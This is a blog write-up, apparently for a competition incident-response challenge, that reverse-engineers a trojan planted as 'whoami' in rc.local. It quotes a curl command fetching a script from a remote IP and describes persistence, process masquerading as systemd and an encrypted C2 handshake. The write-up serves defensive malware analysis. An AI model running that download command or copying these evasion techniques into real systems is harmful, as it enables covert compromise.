# 2025长城杯决赛应急响应木马分析

2025长城杯决赛应急响应木马分析
&lt;!--more--&gt;
## 前言
赛时把整个系统几乎翻了个遍，其实是看到了关键点的，但是没有进一步去分析，很可惜，赛后听朋友说木马文件叫whoami，才想起来之前翻到过的`rc.local`里的`whoami`。趁着今天晚上有空就去分析了一下这个木马，感觉难度不是很大，这里分享一下我的分析过程

## 分析
在`/var/ftp/ftp.sh`中可以看到一条可疑的命令，但是翻了半天也没能找到这个文件，日志也没有什么有用的信息，不知道这个sh到底做了什么，那也就只能按部就班的排查了
```shell
curl -o 1.sh http://101.212.77.123:8080/1.sh
```

在`/etc/rc.local`和`/etc/rc.d/rc.local`中都可以看到如下代码
&gt; 在 Linux 中，/etc/rc.local 文件用于在系统启动的最后阶段执行用户自定义的命令。通常用于启动一些需要在系统完全启动后运行的自定义服务或脚本
```shell
#!/bin/bash
# THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES
#
# It is highly advisable to create own systemd services or udev rules
# to run scripts during boot instead of using this file.
#
# In contrast to previous versions due to parallel execution during boot
# this script will NOT be run after all other services.
#
# Please note that you must run &#39;chmod &#43;x /etc/rc.d/rc.local&#39; to ensure
# that this script will be executed during boot.

touch /var/lock/subsys/local
whoami
```

这个whoami就是被替换掉的木马文件，接下来对他进行逆向分析

字符串的解密为rc4算法，key取6位，即`BIO_wr`
![](/images/2025长城杯决赛应急响应木马分析/image.png)

木马程序先是fork创建了一个子进程，执行了`/bin/nms`下的`nms`，这里没有对应的文件，就不分析他的行为了
![](/images/2025长城杯决赛应急响应木马分析/image-1.png)

父进程将标准输出和错误重定向到`/dev/null`以隐藏所有输出，然后创建一个锁文件`/tmp/systemd.lock`，再调用prctl将进程名改为`systemd`伪装成系统服务，最后等待子进程结束

![](/images/2025长城杯决赛应急响应木马分析/image-2.png)

再创建一个子进程

![](/images/2025长城杯决赛应急响应木马分析/image-3.png)

`sub_403F72`尝试获取文件的独占锁，确保只有一个实例运行
![](/images/2025长城杯决赛应急响应木马分析/image-4.png)

`sub_403F08`创建守护进程

![](/images/2025长城杯决赛应急响应木马分析/image-5.png)

接下来`sub_403867`就是主要分析的后门函数了

开头就是常规的socket连接，有一个随机延迟sleep应该是为了逃避检测，这里可以得到第一问的答案了: `flag{md5(101.212.78.52:36543)}`
![](/images/2025长城杯决赛应急响应木马分析/image-6.png)

由于是在内网，所以这里可以选择挂个frp穿出来，也可以将ida的linux server传进去来远程调试，以此来拿到服务器返回的数据

接着生成随机32个字节作为后面aes的key，解密了公钥去加密aes key，将加密后的key发送到服务器，然后接收并aes解密消息，判断是否为`connection`，是的话将`close`发送过去，最后判断返回消息是否为`getkey`
![](/images/2025长城杯决赛应急响应木马分析/image-7.png)

然后下发RSA的私钥，解密一段硬编码的数据，由于我这里是赛后复现的没有环境，所以没有私钥，无法解密，但是根据后面的分析猜测解密出来的应该是一个AES的key
![](/images/2025长城杯决赛应急响应木马分析/image-8.png)

解密出来的key会再被加密一次，跟前面加密公钥的是同一个算法，逆序和异或
![](/images/2025长城杯决赛应急响应木马分析/image-9.png)

然后把key传入`sub_4036A1`，接下来就是跟flag相关的算法了
![](/images/2025长城杯决赛应急响应木马分析/image-10.png)

算法随机生成一个flag
![](/images/2025长城杯决赛应急响应木马分析/image-11.png)

第一次加密

![](/images/2025长城杯决赛应急响应木马分析/image-12.png)

然后AES加密，key就是前面传入的参数

![](/images/2025长城杯决赛应急响应木马分析/image-13.png)

最终加密

![](/images/2025长城杯决赛应急响应木马分析/image-14.png)

最后把加密的数据base64后写到`/var/log/tuned/tun.log`中，`ZW4n7e&#43;/b7iNSxHNhAB&#43;QIWcAkocWT90WdU9qWDoeew=`
![](/images/2025长城杯决赛应急响应木马分析/image-15.png)

## 总结
木马的整个流程和flag加密算法的分析大致就是这样了，由于没有私钥没办法解密拿到AES的key，这里也就不做解密的分析了，都是些简单算法相信也难不倒各位师傅哈哈，如果有问题还请指正！

---

> Author: yuro  
> URL: /posts/3af7d12/  

